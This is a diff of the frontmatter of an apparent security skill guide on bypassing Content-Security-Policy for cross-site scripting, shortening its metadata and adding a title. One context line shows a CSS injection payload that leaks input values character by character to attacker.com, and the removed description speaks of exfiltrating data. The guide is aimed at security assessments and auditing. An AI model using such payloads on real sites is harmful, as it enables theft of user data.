@@ -1,36 +1,11 @@
 ---
-name: acs-performing-content-security-policy-bypass
-description: Analyze Content-Security-Policy headers and bypass them to achieve cross-site
-  scripting by exploiting unsafe-inline/unsafe-eval, whitelisted JSONP endpoints, base-uri
-  and form-action gaps, and nonce/hash weaknesses, then exfiltrate data even without
-  script-src control. Use during web application security assessments or bug bounty
-  hunting when XSS is found but blocked by CSP, or when auditing CSP header configuration
-  for weaknesses.
-domain: cybersecurity
-subdomain: web-application-security
-tags:
-- csp-bypass
-- content-security-policy
-- xss
-- script-injection
-- nonce-bypass
-- jsonp
-- policy-misconfiguration
-version: '1.0'
-author: mahipal
-license: Apache-2.0
-nist_csf:
-- PR.PS-01
-- ID.RA-01
-- PR.DS-10
-- DE.CM-01
-mitre_attack:
-- T1190
-- T1059.007
-- T1505.003
-- T1083
-- T1055
+name: "acs-performing-content-security-policy-bypass"
+description: "Analyze Content-Security-Policy headers and bypass them to achieve cross-site"
 ---
+
+# Acs Performing Content Security Policy Bypass
+
+*Sourced from abdo453-hunterai*
 
 # Performing Content Security Policy Bypass
 
@@ -249,3 +224,4 @@ input[value^="b"] { background: url("https://attacker.com/?char=b"); }
 - Migrate from unsafe-inline to strict nonce-based policy
 - Implement strict-dynamic for modern CSP3 browsers
 ```
+
